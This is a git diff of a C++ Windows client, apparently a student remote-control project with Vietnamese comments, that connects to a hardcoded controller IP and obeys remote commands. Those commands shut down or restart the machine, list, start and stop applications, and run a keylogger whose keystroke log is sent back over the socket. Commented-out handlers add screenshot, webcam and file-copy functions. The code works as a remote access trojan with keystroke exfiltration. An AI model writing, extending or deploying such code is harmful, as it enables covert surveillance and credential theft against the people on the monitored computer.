@@ -140,14 +140,20 @@
 #include <chrono>
 #include <thread>
 #include<atomic>
+#include "Utility.h"
+// #include "service.cpp"
+#include<sstream>
+#include <locale>
+#include <codecvt>
 
 #pragma comment(lib, "Ws2_32.lib")
 
 using namespace std;
 
 #define bufferSize 1024
+#define BUFFER_SIZE 1024
 
-void sendFile(SOCKET acceptSocket, const char* filename) {
+void sendFile(SOCKET serverSocket, const char* filename) {
     ifstream file(filename, ios::binary);
     if (!file.is_open()) {
         cout << "Failed to open file: " << filename << endl;
@@ -160,78 +166,129 @@ void sendFile(SOCKET acceptSocket, const char* filename) {
     file.seekg(0, ios::beg);
 
     // Gửi kích thước tệp
-    send(acceptSocket, (char*)&file_size, sizeof(file_size), 0);
+    send(serverSocket, (char*)&file_size, sizeof(file_size), 0);
 
     // Gửi nội dung tệp
     char buffer[bufferSize];
     while (!file.eof()) {
         file.read(buffer, bufferSize);
         int bytes_read = file.gcount();
-        send(acceptSocket, buffer, bytes_read, 0);
+        send(serverSocket, buffer, bytes_read, 0);
     }
 
     file.close();
 }
 
-static std::atomic<bool> running{true};
+// static std::atomic<bool> running{true};
 
-void displayKeyPress(const char* action, int key) {
-    std::cout << action << ": " << (char)key 
-              << " (ASCII: " << key << ")" << std::endl;
-}
+// void displayKeyPress(const char* action, int key) {
+//     std::cout << action << ": " << (char)key 
+//               << " (ASCII: " << key << ")" << std::endl;
+// }
 
-void keyboardMonitor() {
-    std::cout << "Keyboard monitoring started. Press ESC to exit.\n";
-    int ok = 0;
-    ofstream fout;
-    fout.open("log.txt", std::ios::app);
-    if (!fout.is_open())
-        cout << "Cannot open file! \n";
-    while(running) {
-        for(int key = 8; key <= 255; key++) {
-            if(GetAsyncKeyState(key) == -32767) {
-                // if(key == VK_ESCAPE) {
-                //     running = false;
-                //     break;
-                // }
-                // if (ok == 0) {
-                //     ok = 1;
-                //     ofstream fout;
-                //     fout.open("log.txt", std::ios::app);
-                // }
-                // ofstream fout;
-                // fout.open("log.txt", std::ios::app);
-                // //displayKeyPress("Key pressed", key);
-                fout << "Key pressed" << ": " << (char)key << " (ASCII: " << key << ")" << std::endl;
-                // while(fout.is_open())
-                //     fout.close();
+// void keyboardMonitor() {
+//     std::cout << "Keyboard monitoring started. Press ESC to exit.\n";
+//     int ok = 0;
+//     ofstream fout;
+//     fout.open("log.txt", std::ios::app);
+//     if (!fout.is_open())
+//         cout << "Cannot open file! \n";
+//     while(running) {
+//         for(int key = 8; key <= 255; key++) {
+//             if(GetAsyncKeyState(key) == -32767) {
+//                 // if(key == VK_ESCAPE) {
+//                 //     running = false;
+//                 //     break;
+//                 // }
+//                 // if (ok == 0) {
+//                 //     ok = 1;
+//                 //     ofstream fout;
+//                 //     fout.open("log.txt", std::ios::app);
+//                 // }
+//                 // ofstream fout;
+//                 // fout.open("log.txt", std::ios::app);
+//                 // //displayKeyPress("Key pressed", key);
+//                 fout << "Key pressed" << ": " << (char)key << " (ASCII: " << key << ")" << std::endl;
+//                 // while(fout.is_open())
+//                 //     fout.close();
+//             }
+//         }
+//         std::this_thread::sleep_for(std::chrono::milliseconds(10));
+//     }
+//     fout.close();
+//     if (!fout.is_open())
+//         cout << "Closed file! \n";
+// }
+
+
+
+// // Example of how to use timer to stop monitoring after specific duration
+// void stopAfterDelay(SOCKET serverSocket) {
+//     char buffer[bufferSize];
+//     int byteCount;
+//     while(true) {
+//         byteCount = recv(serverSocket, buffer, bufferSize, 0);
+//             if (byteCount > 0) {
+//                 cout << buffer << "\n";
+//                 if (strcmp(buffer, "STOP") == 0) {
+//                     running = false;
+//                     break;
+//                 }
+//             }
+//     }
+// }
+
+void sendFile(SOCKET clientSocket, const std::string& filePath) {
+    std::ifstream file(filePath, std::ios::binary | std::ios::ate);
+    if (!file.is_open()) {
+        std::cerr << "Failed to open file." << std::endl;
+        return;
+    }
+
+    // Get file size
+    std::streamsize fileSize = file.tellg();
+    file.seekg(0, std::ios::beg);
+
+    // Send file info header: "SendFile: filename filesize"
+    std::string filename = filePath.substr(filePath.find_last_of("/\\") + 1);
+    std::string fileHeader = "SendFile: " + filename + " " + std::to_string(fileSize);
+    send(clientSocket, fileHeader.c_str(), fileHeader.size(), 0);
+
+    // Wait for confirmation from the receiver
+    char ackBuffer[10];
+    recv(clientSocket, ackBuffer, sizeof(ackBuffer), 0);
+
+    // Send file contents in chunks
+    char buffer[BUFFER_SIZE];
+    std::streamsize totalSent = 0;
+    while (file) {
+        file.read(buffer, BUFFER_SIZE);
+        std::streamsize bytesToSend = file.gcount();
+
+        int bytesSent = 0;
+        while (bytesSent < bytesToSend) {
+            int sent = send(clientSocket, buffer + bytesSent, bytesToSend - bytesSent, 0);
+            if (sent == SOCKET_ERROR) {
+                std::cerr << "Error sending file." << std::endl;
+                return;
             }
+            bytesSent += sent;
         }
-        std::this_thread::sleep_for(std::chrono::milliseconds(10));
+        totalSent += bytesSent;
     }
-    fout.close();
-    if (!fout.is_open())
-        cout << "Closed file! \n";
+
+    // Send end-of-file signal
+    std::string endSignal = "FileEnd";
+    send(clientSocket, endSignal.c_str(), endSignal.size(), 0);
+
+    file.close();
+    std::cout << "File sent successfully. Total bytes sent: " << totalSent << std::endl;
 }
 
-
-
-// Example of how to use timer to stop monitoring after specific duration
-void stopAfterDelay(SOCKET serverSocket) {
-    char buffer[bufferSize];
-    int byteCount;
-    while(true) {
-        byteCount = recv(serverSocket, buffer, bufferSize, 0);
-            if (byteCount > 0) {
-                cout << buffer << "\n";
-                if (strcmp(buffer, "STOP") == 0) {
-                    running = false;
-                    break;
-                }
-            }
-    }
+std::wstring stringToWstring(const std::string& str) {
+    std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
+    return converter.from_bytes(str);
 }
-
 
 int main() {
 
@@ -269,7 +326,7 @@ int main() {
 
     sockaddr_in service;
     service.sin_family = AF_INET;
-    InetPton(AF_INET, "10.123.0.185", &service.sin_addr.s_addr);
+    InetPton(AF_INET, "10.122.1.138", &service.sin_addr.s_addr);
     service.sin_port = htons(port);
     if (connect(serverSocket, (SOCKADDR*)&service, sizeof(service)) == SOCKET_ERROR) {
         cout << "Client: connect() - Failed to connect." << endl;
@@ -307,37 +364,57 @@ int main() {
 
         char buffer[bufferSize];
         int byteCount;
-
+        Computer computer;
         while (true) {
             // Nhận tin nhắn từ client
             byteCount = recv(serverSocket, buffer, bufferSize, 0);
+
             if (byteCount > 0) {
                 // Đảm bảo chuỗi kết thúc đúng
                 buffer[byteCount] = '\0';
+                string tmp(buffer);
+                vector<string> v;
+                stringstream ss(tmp);
+                string w;
+                while (ss >> w) {
+                    v.push_back(w);
+                }
                 cout << "Message from client: " << buffer << endl;
-                if (strcmp(buffer, "KEYLOGGER") == 0) {
-                    std::cout << "Starting keyboard input monitor...\n";
-                    std::cout << "All keyboard input will be displayed in this window.\n";
-                    std::cout << "This program runs with user awareness for input testing.\n";
-                    std::cout << "Program will stop after 10 seconds or press ESC to exit.\n\n";
-
-                    // Start monitoring thread
-                    std::thread monitorThread(keyboardMonitor);
-                    
-                    // Create another thread to stop monitoring after 10 seconds
-                    std::thread timerThread(stopAfterDelay, serverSocket);
-                    // Wait for monitoring thread to finish
-                    monitorThread.join();
-                    
-                    // Wait for timer thread to finish
-                    timerThread.join();
-                    running = true;
+                if (strcmp(buffer, "SHUTDOWN") == 0) computer.shutdown();
+                else if (strcmp(buffer, "RESET") == 0) computer.reset();
+                else if (strcmp(buffer, "LISTAPP") == 0) {
+                    computer.listApp();
+                    computer.copyFile(serverSocket, "listApp.txt");
+                }
+                else if (v[0] == "STARTAPP") {
+                    computer.startApp(v[1]);
 
                 }
-                else if (strcmp(buffer, "stopkeylogger") == 0) {
-                    
-                    
-                    std::cout << "\nKeyboard monitoring stopped.\n";
+                else if (v[0] == "STOPAPP") {
+                    computer.stopApp(v[1]);
+                }
+                // else if (strcmp(buffer, "LISTSERVICE") == 0) {
+                //     //std::vector<ServiceManager::ServiceInfo> service = computer.listServices();
+                //     int a;
+
+                // }
+                // else if(v[0] == "STARTSERVICE") {
+                //     std::wstring ws = stringToWstring(v[1]);
+                //     bool ok = computer.startService(ws);
+                // }
+                // else if(strcmp(buffer, "STOPSERVICE") == 0) {
+                //     std::wstring ws = stringToWstring(v[1]);
+                //     computer.stopService(ws);
+                // }
+                //else if (strcmp(buffer, "SCREENSHOT") == 0) computer.screenShot();
+                // else if (v[0] == "COPYFILE") {
+                //     computer.copyFile(serverSocket, v[1]);
+                // }
+                //else if (strcmp(buffer, "STARTWEBCAME") == 0) computer.startWebcame();
+                //else if (strcmp(buffer, "STOPWEBCAME") == 0) computer.stopWebcame();
+                else if (strcmp(buffer, "KEYLOGGER") == 0) {
+                    computer.keyLogger(serverSocket);
+                    computer.copyFile(serverSocket, "log.txt");
                 }
             }
             else if (byteCount == 0) {
